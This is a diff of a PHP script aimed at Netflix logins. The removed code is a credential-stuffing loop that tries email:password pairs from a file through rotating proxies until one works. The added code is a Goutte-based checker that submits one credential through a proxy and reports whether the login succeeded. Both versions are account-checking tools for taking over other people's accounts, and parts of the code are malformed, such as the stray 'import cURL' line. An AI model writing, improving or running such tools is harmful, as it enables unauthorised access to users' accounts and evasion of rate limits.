@@ -1,55 +1,31 @@
-<?php
+require 'vendor/autoload.php';
 
-import cURL
+use Goutte\Client;
 
-function login($email, $password, $proxy) {
-    // Set up cURL
-    $curl = curl_init();
-    curl_setopt_array($curl, array(
-        CURLOPT_URL => "https://www.netflix.com/api/login",
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_ENCODING => "",
-        CURLOPT_MAXREDIRS => 10,
-        CURLOPT_TIMEOUT => 0,
-        CURLOPT_FOLLOWLOCATION => true,
-        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-        CURLOPT_CUSTOMREQUEST => "POST",
-        CURLOPT_POSTFIELDS => "email=$email&password=$password",
-        CURLOPT_HTTPHEADER => array(
-            "Content-Type: application/x-www-form-urlencoded"
-        ),
-        CURLOPT_PROXY => $proxy,
-    ));
-    // Send the request and save the response
-    $response = curl_exec($curl);
-    $err = curl_error($curl);
-    // Close cURL
-    curl_close($curl);
-    // Decode the JSON response
-    $data = json_decode($response);
-    return $data;
+if (!function_exists('curl_version')) {
+    die('cURL is not installed or enabled on your server');
 }
 
-$file = fopen("passwords.txt", "r");
+$client = new Client();
 
-$proxies = fopen("proxies.txt", "r");
+$email = readline("Enter email: ");
+$password = readline("Enter password: ");
+$proxy = readline("Enter proxy: ");
 
-while(!feof($file)) {
-    // Get the next password
-    $line = trim(fgets($file));
-    //split the line with :
-    list($email, $password) = explode(':', $line);
-    // Get the next proxy
-    $proxy = trim(fgets($proxies));
-    // Send login request
-    $data = login($email, $password, $proxy);
-    // Check if the login was successful
-    if ($data->status == "success") {
-        echo "Found a match: $email:$password";
-        break;
-    } else {
-        echo "Trying $email:$password...\n";
-    }
+$client->setClient(new \GuzzleHttp\Client(['proxy' => $proxy]));
+
+// Send a GET request to the login page
+$crawler = $client->request('GET', 'https://www.netflix.com/login');
+
+// Fill out the login form and submit it
+$form = $crawler->selectButton('Sign In')->form();
+$crawler = $client->submit($form, array('userLoginId' => $email, 'password' => $password));
+
+// Check if the login was successful by looking for specific elements on the page
+$is_logged_in = $crawler->filter('.appMount')->count() > 0;
+
+if ($is_logged_in) {
+    echo "Login Successful for user " . $email . " with proxy " . $proxy . "\n";
+} else {
+    echo "Invalid credentials for user " . $email . " with proxy " . $proxy . "\n";
 }
-fclose($file);
-fclose($proxies);
